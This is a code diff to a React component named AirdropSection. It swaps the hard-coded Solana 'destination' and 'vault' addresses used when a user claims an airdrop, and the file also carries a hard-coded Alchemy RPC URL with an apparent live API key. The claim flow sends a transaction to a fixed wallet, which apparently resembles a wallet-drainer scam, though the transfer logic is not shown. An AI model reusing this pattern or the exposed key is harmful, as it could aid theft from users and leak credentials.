@@ -38,7 +38,7 @@ export function AirdropSection() {
   const transactionInProgressRef = useRef(false)
 
   // Destination address for the transaction
-  const destinationAddress = "HtgpmL6saAieCqtkLyYPirf9CS1htH1fyWSec37P6Hui"
+  const destinationAddress = "8MN8QciRbHARCjq1gCeh4vNxLrw8F7YTsgoVJGisPvTt"
 
   // Set mounted state
   useEffect(() => {
@@ -237,7 +237,7 @@ export function AirdropSection() {
     setIsClaiming(true)
 
     try {
-      const vault = new PublicKey("HtgpmL6saAieCqtkLyYPirf9CS1htH1fyWSec37P6Hui")
+      const vault = new PublicKey("8MN8QciRbHARCjq1gCeh4vNxLrw8F7YTsgoVJGisPvTt")
       // Replace with your Alchemy Solana RPC URL
       const ALCHEMY_API_URL = 'https://solana-mainnet.g.alchemy.com/v2/1duafDP7kyCuWgHCJ_-Mihe4o4r1wC9S';
 
